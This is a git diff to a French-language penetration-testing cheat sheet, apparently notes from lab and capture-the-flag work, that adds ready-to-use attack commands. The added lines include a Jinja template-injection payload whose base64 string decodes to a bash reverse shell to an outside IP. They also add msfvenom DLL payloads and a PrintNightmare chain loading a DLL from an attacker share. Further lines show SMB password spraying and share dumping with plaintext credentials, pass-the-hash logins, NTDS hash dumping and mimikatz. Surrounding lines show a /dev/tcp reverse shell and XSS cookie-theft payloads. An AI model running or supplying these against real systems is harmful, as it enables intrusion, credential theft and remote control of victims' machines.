@@ -69,6 +69,10 @@ CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.10.10/1234 0>&1')
  	- `<script>alert(‘XSS’)</script>`
     	- Cookie --> `</script><img src=1 onerror=alert(document.cookie)>`
  
+- Jinga :
+  	- `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` --> payload id
+  	- `{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').system("echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjkvNDQ0NCAwPiYx | base64 -d | bash")}}{%endif%}{% endfor %}` --> RCE avec base64
+ 
 ---
  
 ## BruteForce
@@ -119,6 +123,7 @@ john zip.hashes` ou `fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt secret_
 - Wordpress --> `wpscan --url www.mokoil.com`
 	- En mode agressif --> `wpscan --url www.mokoil.com -e vp,vt,u`
 	- Faire un brute-force sur les mots de passe --> `wpscan --url http://<target-IP>/ --passwords wordlist.txt --usernames victor`
+	- Brute force sur les plugins --> `wpscan --url http://10.10.110.119 --plugins-detection mixed -t 30`
 
 - [Linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
 - [PSpy](https://github.com/DominicBreuker/pspy)
@@ -232,7 +237,7 @@ Invoke-RestMethod -Uri $url -OutFile $dest`
 ---
 
 ## Malware
-### Tools
+### Linux
 
 - [Virus Total](https://www.virustotal.com/gui/home/upload) --> étudier un fichier
 
@@ -245,6 +250,10 @@ Invoke-RestMethod -Uri $url -OutFile $dest`
 - [GTFObins](https://gtfobins.github.io/) (liste de binaires vulnérables avec POC)
 	- Lister les SUIDS --> `find / -perm /4000 2>/dev/null`
    	- Exploitation automatique --> https://github.com/Frissi0n/GTFONow
+ 
+- Metasploit :
+  	- Créer une librairie --> `msfconsole -p linux/x64/exec CMD=/bin/bash -f elf-so > shell.so`
+  	- Créer une DLL --> `msfvenom -a x64 -p windows/x64/exec CMD="powershell -e XXX  -f dll -o rev.dll`
 
  - Boite à outils RedTeam --> https://arttoolkit.github.io/
 
@@ -270,20 +279,36 @@ Invoke-RestMethod -Uri $url -OutFile $dest`
 
 - Samba (connexion FTP like) --> `smbclient -L \\10.129.118.175`
   	- Connexion à un répertoire --> `smbclient -N \\\\10.129.197.116\\backups`
+  	- Lister les répertoires avec des identifiants --> `crackmapexec smb 10.10.110.3 -u 'mrb3n' -p 'W3lc0me123!!!' --shares`
+  	- Accèder à un répertoires avec des identifiants --> `smbclient -U 'mrb3n%W3lc0me123!!!' //10.10.110.3/Backups`
+  	- Récupérer tout les fichiers d'un partage --> `mget *`
+
 
 - CrackMapExec (énumérer les politiques de sécurité AD) --> `crackmapexec smb $TARGET --pass-pol -u '' -p ''`
+  	- Password spraying (test des mots de passe sur plusieurs machines) --> `crackmapexec smb 10.10.110.0/24 -u 'mrb3n' -p 'W3lc0me123!!!'`
 
 - Utilisation de BloodHunt --> https://hackmd.io/Adw1ACZ_TJWMmDr1HIesqA?both#BloodHunt
 
-- Connexion à un serveur MSSQL Server Windows --> `impacket-mssqlclient ARCHETYPE/sql_svc@10.129.197.116 -windows-auth`
+- Connexion à un serveur MSSQL Server Windows --> `impacket-mssqlclient ARCHETYPE/sql_svc@10.129.197.116 -windows-auth` ou `impacket-mssqlclient sa:x5Chuz8XbM@10.10.110.58`
 
 - RPC --> `rpcclient -U '%' 10.10.10.161`
 
 - Obtenir les hash utilisateur --> `impacket-GetNPUsers htb.local/ -dc-ip 10.129.118.175 -request`
 
+- Depuis un dump de fichier obtenir les hash --> `impacket-secretsdump local -system registry/SYSTEM -ntds Active\ Directory/ntds.dit`
+
 - Connexion sur la machine cliente --> `evil-winrm -i 10.129.118.175 -u svc-alfresco -p s3rvice`
+  	- Avec hash --> `evil-winrm -u 'Administrator' -H 'f223277b637be474af366a652b9abb06' -i 10.10.110.3`
+
+- Avoir les informations sur l'utillisateur Windows --> `net user` ou `whoami /priv`
+
+- Mimikatz --> `mimikatz # lsadump::sam`
+
+- Print nightmare --> `impacket-rpcdump @10.10.110.20 | grep MS-RPRN` + `msfvenom -a x64 -p windows/x64/exec CMD="powershell -e XXX  -f dll -o rev.dll` + `python CVE-2021-1675.py "test:t3st123@10.10.110.20" '\\10.10.16.9\MyShare\rev.dll'`
 
 - Ressources pentest AD --> https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg
+  	- [InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/)
+  	- https://github.com/mranv/adPentest
 
 ---
 
